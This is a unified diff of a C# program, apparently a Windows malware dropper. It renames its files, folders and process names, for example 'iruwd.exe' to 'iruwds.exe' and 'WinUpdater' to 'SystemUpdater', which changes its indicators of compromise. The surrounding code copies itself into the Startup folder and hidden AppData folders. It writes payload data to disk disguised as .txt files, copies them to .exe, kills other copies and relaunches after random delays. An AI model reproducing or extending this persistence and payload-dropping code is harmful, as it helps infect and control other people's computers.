@@ -41,7 +41,7 @@ namespace iruwd7
         string[] directories = Directory.GetDirectories(Application.StartupPath);
 
         string MF =Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        string UF = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Pupt");
+        string UF = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Pupts");
 
         public string responseString = "";
 
@@ -100,7 +100,7 @@ namespace iruwd7
 
             if (mp.Contains(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                 return "FWD";
-            else if (mp.Contains(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802")))
+            else if (mp.Contains(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704")))
                 return "SWD";
             else if (mp.Contains(UF))
                 return "UP";
@@ -119,7 +119,7 @@ namespace iruwd7
 
             string[] ps = mp.Split('\\');
             string fn = ps[ps.Length - 1]; // file name 
-            string tfn = "iruwd.exe";
+            string tfn = "iruwds.exe";
 
             //string Opdir = "";
       
@@ -141,7 +141,7 @@ namespace iruwd7
           
 
             string FInsFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");
+            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704");
 
             if (File.Exists(Path.Combine(FInsFolder, tfn)))
             {
@@ -189,9 +189,9 @@ namespace iruwd7
                 Environment.Exit(0);
             Init();
 
-            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");
+            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704");
 
-            if (!File.Exists(Path.Combine(bfolder, "iruwd.exe")))
+            if (!File.Exists(Path.Combine(bfolder, "iruwds.exe")))
             {
                 try
                 {
@@ -202,12 +202,12 @@ namespace iruwd7
                 {
 
                 }
-                CopyF(mp, Path.Combine(bfolder, "iruwd.exe"));
-                StartPro(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802"), "iruwd.exe"));
+                CopyF(mp, Path.Combine(bfolder, "iruwds.exe"));
+                StartPro(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704"), "iruwds.exe"));
             }
             else
             {
-                StartPro(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802"), "iruwd.exe"));
+                StartPro(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704"), "iruwds.exe"));
             }
 
 
@@ -242,17 +242,17 @@ namespace iruwd7
 
                 Init();
 
-                if (!File.Exists(Path.Combine(MF, "iruwd.exe")))
+                if (!File.Exists(Path.Combine(MF, "iruwds.exe")))
                 {
 
-                    CopyF(mp, Path.Combine(MF, "iruwd.exe"));
+                    CopyF(mp, Path.Combine(MF, "iruwds.exe"));
 
                     Thread.Sleep(TimeSpan.FromSeconds(2));
                 }
 
 
 
-                StartPro(Path.Combine(MF, "iruwd.exe"));
+                StartPro(Path.Combine(MF, "iruwds.exe"));
 
                 Thread.Sleep(TimeSpan.FromSeconds(3));
                 Environment.Exit(0);
@@ -267,10 +267,10 @@ namespace iruwd7
 
             Init();
 
-            if (!File.Exists(Path.Combine(MF, "iruwd.exe")))
+            if (!File.Exists(Path.Combine(MF, "iruwds.exe")))
             {
 
-                CopyF(mp, Path.Combine(MF, "iruwd.exe"));
+                CopyF(mp, Path.Combine(MF, "iruwds.exe"));
 
                 Thread.Sleep(TimeSpan.FromSeconds(2));
             }
@@ -278,7 +278,7 @@ namespace iruwd7
 
             Thread.Sleep(TimeSpan.FromSeconds(rn.Next(30, 180)));
 
-            StartPro(Path.Combine(MF, "iruwd.exe"));
+            StartPro(Path.Combine(MF, "iruwds.exe"));
 
             Thread.Sleep(TimeSpan.FromSeconds(5));
             Environment.Exit(0);
@@ -405,14 +405,14 @@ namespace iruwd7
                 //process.StandardInput.WriteLine(string.Format("$Decodedbytes = [Convert]::FromBase64String('{0}')", data[2]));
                 //process.StandardInput.WriteLine(string.Format("[IO.File]::WriteAllBytes('{0}', $Decodedbytes)", Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"), "explorer.exe")));
 
-                CreateF(data[2], Path.Combine(UF, "WinUpdater.txt"));
+                CreateF(data[2], Path.Combine(UF, "SystemUpdater.txt"));
 
 
                 //WebClient client = new WebClient();
                 //process.StandardInput.WriteLine(string.Format("$Decodedbytes = [Convert]::FromBase64String('{0}')", data[1]));
-                //process.StandardInput.WriteLine(string.Format("[IO.File]::WriteAllBytes('{0}', $Decodedbytes)", Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"), "niruwd.exe")));
+                //process.StandardInput.WriteLine(string.Format("[IO.File]::WriteAllBytes('{0}', $Decodedbytes)", Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"), "niruwds.exe")));
 
-                CreateF(data[1], Path.Combine(UF, "niruwd.txt"));
+                CreateF(data[1], Path.Combine(UF, "niruwds.txt"));
                 Thread.Sleep(TimeSpan.FromSeconds(10));
 
              
@@ -423,14 +423,14 @@ namespace iruwd7
                 Process[] pr = Process.GetProcesses();
                 foreach (Process pro in pr)
                 {
-                    if (pro.ProcessName.Contains("iruwd"))
+                    if (pro.ProcessName.Contains("iruwds"))
                     {
                         if (!(pro.MainModule.FileName.Contains(Application.StartupPath)))
                             pro.Kill();
                     }
 
 
-                    if (pro.ProcessName.Contains("WinUpdater"))
+                    if (pro.ProcessName.Contains("SystemUpdater"))
                     {
                         if (pro.MainModule.FileName.Contains(MF))
                             pro.Kill();
@@ -439,22 +439,22 @@ namespace iruwd7
                 }
 
                 string FWDF = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                string SWDF = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");
+                string SWDF = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704");
 
-                CopyF(Path.Combine(UF, "niruwd.txt"), Path.Combine(FWDF, "iruwd.exe"));
+                CopyF(Path.Combine(UF, "niruwds.txt"), Path.Combine(FWDF, "iruwds.exe"));
 
-                CopyF(Path.Combine(UF, "niruwd.txt"), Path.Combine(SWDF, "iruwd.exe"));
-                CopyF(Path.Combine(UF, "WinUpdater.txt"), Path.Combine(MF, "WinUpdater.exe"));
+                CopyF(Path.Combine(UF, "niruwds.txt"), Path.Combine(SWDF, "iruwds.exe"));
+                CopyF(Path.Combine(UF, "SystemUpdater.txt"), Path.Combine(MF, "SystemUpdater.exe"));
 
                 Thread.Sleep(TimeSpan.FromSeconds(2));
 
-                StartPro(Path.Combine(SWDF, "iruwd.exe"));
+                StartPro(Path.Combine(SWDF, "iruwds.exe"));
 
                 if (strerr.Length > 2)
                 {
 
                     Thread.Sleep(TimeSpan.FromSeconds(10));
-                    StartPro(Path.Combine(SWDF, "iruwd.exe"));
+                    StartPro(Path.Combine(SWDF, "iruwds.exe"));
                 }
 
             }
@@ -482,7 +482,7 @@ namespace iruwd7
 
             if (!IsO())
                 StartV();
-            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");
+            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "US1704");
 
             try
             {
@@ -494,7 +494,7 @@ namespace iruwd7
             }
 
             Thread.Sleep(TimeSpan.FromSeconds(rn.Next(30, 180)));
-            StartPro(Path.Combine(bfolder, "iruwd.exe"));
+            StartPro(Path.Combine(bfolder, "iruwds.exe"));
             Thread.Sleep(TimeSpan.FromSeconds(1));
             Environment.Exit(0);
 
@@ -509,7 +509,7 @@ namespace iruwd7
             try
             {
                 Thread.Sleep(rn.Next(500, 5000));
-                Process[] pr = Process.GetProcessesByName("iruwd");
+                Process[] pr = Process.GetProcessesByName("iruwds");
 
                 if (pr.Length > 0)
                 {
@@ -560,7 +560,7 @@ namespace iruwd7
 
             string[] ps = mp.Split('\\');
             string fn = ps[ps.Length - 1]; // file name 
-            string tfn = "iruwd.exe";
+            string tfn = "iruwds.exe";
             Thread.Sleep(500);
             try
             {
@@ -584,7 +584,7 @@ namespace iruwd7
            
             try
             {
-                Process.Start(Path.Combine(MF, "WinUpdater.exe"));
+                Process.Start(Path.Combine(MF, "SystemUpdater.exe"));
             }
             catch (Exception)
             {
@@ -630,7 +630,7 @@ namespace iruwd7
             try
             {
 
-                Process[] pr = Process.GetProcessesByName("WinUpdater");
+                Process[] pr = Process.GetProcessesByName("SystemUpdater");
 
                 if (pr.Length > 0)
                 {
